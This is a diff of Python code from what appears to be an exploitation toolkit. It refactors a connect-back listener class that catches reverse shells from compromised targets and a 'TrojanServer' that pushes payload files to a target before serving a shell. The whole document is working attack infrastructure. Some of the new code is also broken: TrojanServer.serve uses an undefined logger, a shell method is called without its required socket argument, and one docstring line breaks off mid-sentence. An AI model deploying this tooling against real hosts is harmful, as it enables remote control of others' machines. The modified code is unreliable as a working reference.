@@ -11,6 +11,7 @@ import os
 import select
 import traceback
 import errno
+from ..common.support import Logging
 
 class ConnectbackServer(object):
     """
@@ -20,8 +21,9 @@ class ConnectbackServer(object):
     connect-back payload and provides an interactive shell.  Think "netcat
     listener" that has an API and can be used programmatically.
     """
+    
     MAX_READ=1024
-    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True):
+    def __init__(self,connectback_ip,port=8080,startcmd=None,connectback_shell=True,logger=None):
         """
         Class constructor.
 
@@ -35,6 +37,7 @@ class ConnectbackServer(object):
             service, or to customize the interactive shell, e.g., '/bin/sh -i'.
         connectback_shell: Optional.  This argument defaults to True, which is
             99% of the time is what you need.  See note.
+        logger: Optional.  A logger object is 
 
         Note
         ----
@@ -44,17 +47,27 @@ class ConnectbackServer(object):
         so:
             server=ConnectbackServer(connectback_ip,startcmd='/sbin/telnetd',connectback_shell=False)
         """
+        if logger:
+            self.logger=logger
+        else:
+            self.logger=Logging()
+
         self.pid=None
         self.connectback_ip=connectback_ip
         self.port=port
         self.startcmd=startcmd
         self.connectback_shell=connectback_shell
 
-    def __handler(self,signum,frame):
+    def _handler(self,signum,frame):
         #print >>sys.stderr,"signal num %d\n"%signum
         self.keepgoing=False
+    
+    def _setup_signals(self):
+        self.keepgoing=True
+        signal.signal(signal.SIGINT,self._handler)
+        signal.signal(signal.SIGTERM,self._handler)
 
-    def __server(self):
+    def _server(self):
         serversocket = socket.socket(
                 socket.AF_INET,socket.SOCK_STREAM)
         serversocket.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
@@ -62,28 +75,22 @@ class ConnectbackServer(object):
         serversocket.bind((self.connectback_ip,int(self.port)))
         serversocket.listen(5)
         return serversocket
-
-    def __exit(self):
+        
+    def _exit(self):
         #this prevents a hang in mod_wsgi, which traps sys.exit()
         os.execv("/bin/true",["/bin/true"])
 
-    def __serve_connectback_shell(self):
+    def _serve_connectback_shell(self,serversocket):
+        self._setup_signals()
         max_read=self.__class__.MAX_READ
-        signal.signal(signal.SIGINT,self.__handler)
-        signal.signal(signal.SIGTERM,self.__handler)
-        server_socket=self.__server()
-        print >>sys.stderr,"Listening on port %d\n" % int(self.port)
-        print >>sys.stderr,"Waiting for incoming connection.\n"
+        self.logger.LOG_INFO("Listening on port %d" % int(self.port))
+        self.logger.LOG_INFO("Waiting for incoming connection.")
         self.keepgoing=True
 
-        try:
-            (clientsocket,addess) = server_socket.accept()
-        except Exception as e:
-            server_socket.shutdown(socket.SHUT_RDWR)
-            server_socket.close()
-            return
+        
+        (clientsocket,addess) = serversocket.accept()
 
-        print "Target has phoned home.\n"
+        self.logger.LOG_INFO("Target has phoned home.")
         fd_to_file={clientsocket.fileno:clientsocket,sys.stdin.fileno():sys.stdin}
         inputlist=[clientsocket,sys.stdin]
 
@@ -115,26 +122,22 @@ class ConnectbackServer(object):
                 #print traceback.format_exc()
                 #print >>sys.stderr,str(e)
                 self.keepgoing=False
-                print >>sys.stderr,""
-                print >>sys.stderr,"Closing connection.\n"
+                self.logger.LOG_INFO("Closing connection.")
                 clientsocket.shutdown(socket.SHUT_RDWR)
                 clientsocket.close()
-                server_socket.shutdown(socket.SHUT_RDWR)
-                server_socket.close()
 
-        print >>sys.stderr,"Exiting\n"
-        self.__exit()
 
     def wait(self):
-        signal.signal(signal.SIGINT,self.__handler)
-        keep_waiting=True
-        while keep_waiting:
+        signal.signal(signal.SIGINT,self._handler)
+        self.keep_going=True
+        status=(0,0)
+        while self.keep_going:
             try:
                 status=os.waitpid(self.pid,0)
-                keep_waiting=False
+                self.keep_going=False
             except OSError as ose:
                 if not ose.errno == errno.EINTR:
-                    keep_waiting = False
+                    self.keep_going = False
 
         signal.signal(signal.SIGINT,signal.SIG_DFL)
         self.pid=None
@@ -155,19 +158,32 @@ class ConnectbackServer(object):
         if self.connectback_shell or self.startcmd:
             if self.pid:
                 raise Exception("There is an existing child process. Pid: %d" %self.pid)
+            try:
+                serversocket=self._server()
+            except Exception as e:
+                self.logger.LOG_WARN("There was an error creating server socket: %s" % str(e))
+                return None
             self.pid=os.fork()
             if self.pid and self.pid > 0:
+                serversocket.close()
                 return self.pid
             else:
-                #no return
-                self.__serve_connectback_shell()
+                try:
+                    self._serve_connectback_shell(serversocket)
+                except Exception as e:
+                    self.logger.LOG_WARN("There was an error serving shell: %s" % str(e))
+
+                serversocket.shutdown(socket.SHUT_RDWR)                    
+                serversocket.close()
+                self._exit()
         else:
             return None
 
 
 class TrojanServer(ConnectbackServer):
-    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False):
-        super(self.__class__,self).__init__(connectback_ip,port=port,startcmd=startcmd,connectback_shell=connectback_shell)
+    def __init__(self,connectback_ip,files_to_serve,port=8080,startcmd=None,connectback_shell=False,logger=None):
+        super(self.__class__,self).__init__(connectback_ip,port=port,startcmd=startcmd,
+                                                connectback_shell=connectback_shell,logger=logger)
         self.files_to_serve=files_to_serve
         self.connectback_shell=connectback_shell
 
@@ -182,24 +198,23 @@ class TrojanServer(ConnectbackServer):
 
 
     def serve(self):
-        pid=os.fork()
-        if 0!= pid:
-            return pid
+        self.pid=os.fork()
+        if 0!= self.pid:
+            return self.pid
+        else:
+            serversocket=self._server()
+            for _file in self.files_to_serve:
+                print "Waiting to send file: %s\n" % _file
+                self.serve_file_to_client(_file,serversocket)
+                print "\nDone with file: %s\n"%_file
 
-        serversocket=self.server(self.port)
-        for _file in self.files_to_serve:
-            print "Waiting to send file: %s\n" % _file
-            self.serve_file_to_client(_file,serversocket)
-            print "\nDone with file: %s\n"%_file
+            serversocket.shutdown(socket.SHUT_RDWR)
+            serversocket.close()
 
-        serversocket.shutdown(socket.SHUT_RDWR)
-        serversocket.close()
-
-        if self.connectback_shell == True:
-            print "Serving connectback_shell."
-            #no return
-            self.__serve_connectback_shell()
-
+            if self.connectback_shell == True:
+                logger.LOG_INFO("Serving connectback_shell.")
+                self._serve_connectback_shell()
+            self._exit()
 
 
 
